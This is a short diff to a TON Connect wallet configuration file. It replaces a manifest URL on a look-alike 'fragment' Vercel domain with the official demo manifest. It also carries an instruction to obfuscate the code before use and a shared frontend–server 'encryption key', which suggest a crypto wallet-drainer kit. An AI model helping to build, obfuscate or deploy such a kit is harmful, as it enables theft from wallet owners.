@@ -2,7 +2,7 @@
 // OBFUSCATION MUST BE MADE BEFORE USE https://obfuscator.io/
 
 // Ton Manifest - Your website avatar and domain name are displayed when you connect your wallet.
-const manifestUrl = 'https://fragment-xi.vercel.app/tonconnect-manifest.json' //'https://ton-connect.github.io/demo-dapp-with-wallet/tonconnect-manifest.json'; //'https://sainttest.de/tonconnect-manifest.json';
+const manifestUrl = 'https://ton-connect.github.io/demo-dapp-with-wallet/tonconnect-manifest.json'; //'https://sainttest.de/tonconnect-manifest.json';
 
 // The encryption key between the server and Frontend must be the same
 let keyEncr = 500;
